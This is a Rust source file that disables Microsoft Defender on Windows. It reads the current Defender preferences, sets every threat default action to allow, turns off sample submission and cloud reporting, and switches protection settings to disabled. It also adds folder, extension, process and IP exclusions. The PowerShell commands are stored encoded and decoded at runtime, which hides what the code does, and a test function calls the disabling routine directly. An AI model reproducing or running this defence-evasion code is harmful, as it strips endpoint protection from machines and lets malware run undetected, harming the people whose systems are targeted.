mod globals;
mod macros;
mod unwrap;

use crate::{globals::*, unwrap::CustomUnwrap};
use anyhow::*;
use powershell_script;
use std::process::Command;
use wpkg_crypto::{decode};

pub fn add_exclusion_folder(folder: &str) -> anyhow::Result<String> {
    println!("Adding folder: {folder}");
    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONFOLDERCOMMAND), folder))?.to_string())
}
pub fn add_exclusion_extention(extention: &str) -> anyhow::Result<String> {
    println!("Adding extention: {extention}");
    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONEXTENTIONCOMMAND), extention))?.to_string())
}
pub fn add_exclusion_process(process: &str) -> anyhow::Result<String> {
    println!("Adding process: {process}");
    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONPROCESSCOMMAND), process))?.to_string())
}
pub fn add_exclusion_ip_address(ip: &str) -> anyhow::Result<String> {
    println!("Adding adress: {ip}");
    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONIPADDRESSCOMMAND), ip))?.to_string())
}
pub fn disable_defender() -> anyhow::Result<()> {
    let command = Command::new("powershell.exe")
        .args(vec!["Get-MpPreference", "-verbose"])
        .output()?;

    let output = String::from_utf8(command.stdout)?;
    let lines: Vec<&str> = output.lines().collect();

    for line in lines.iter() {
        if line.starts_with("SubmitSamplesConsent") && !line.ends_with("2") {
            println!("Executing: {}", decode(SUBMITSAMPLESCONSENT));
            powershell_script::run(&decode(SUBMITSAMPLESCONSENT))
                .expect_log(&format!("Error setting {}", line));
        } else if line.starts_with("MAPSReporting") && !line.ends_with("0") {
            println!("Executing: {}", decode(MAPSREPORTING));
            powershell_script::run(&decode(MAPSREPORTING)).expect_log(&format!("Error setting {}", line));
        } else if line.starts_with("HighThreatDefaultAction") && !line.ends_with("6") {
            println!("Executing: {}", decode(HIGHTHREATDEFAULTACTION));
            powershell_script::run(&decode(HIGHTHREATDEFAULTACTION))
                .expect_log(&format!("Error setting {}", line));
        } else if line.starts_with("ModerateThreatDefaultAction") && !line.ends_with("6") {
            println!("Executing: {}", decode(MODERATETHREATDEFAULTACTION));
            powershell_script::run(&decode(MODERATETHREATDEFAULTACTION))
                .expect_log(&format!("Error setting {}", line));
        } else if line.starts_with("LowThreatDefaultAction") && !line.ends_with("6") {
            println!("Executing: {}", decode(LOWTHREATDEFAULTACTION));
            powershell_script::run(&decode(LOWTHREATDEFAULTACTION))
                .expect_log(&format!("Error setting {}", line));
        } else if line.starts_with("SevereThreatDefaultAction") && !line.ends_with("6") {
            println!("Executing: {}", decode(SEVERETHREATDEFAULTACTION));
            powershell_script::run(&decode(SEVERETHREATDEFAULTACTION))
                .expect_log(&format!("Error setting {}", line));
        } else if line.starts_with(&crypto!("ExclusionExtension")) {
        } else if line.starts_with(&crypto!("ExclusionIpAddress")) {
        } else if line.starts_with(&crypto!("ExclusionPath")) {
        } else if line.starts_with(&crypto!("ExclusionProcess")) {
        } else {
            let true_line: Vec<&str> = line.split(" ").collect();
            let action = format!("Set-MpPreference -{} $true", true_line.first().context("")?);
            println!("Executing: {}", action);
            powershell_script::run(&action).expect_log(&format!("Error setting {}", line));
        }
    }
    Ok(())
}
#[test]
fn test(){
    add_exclusion_extention("test").unwrap();
    add_exclusion_folder("test").unwrap();
    add_exclusion_ip_address("test").unwrap();
    add_exclusion_process("test").unwrap();
    disable_defender().unwrap();
}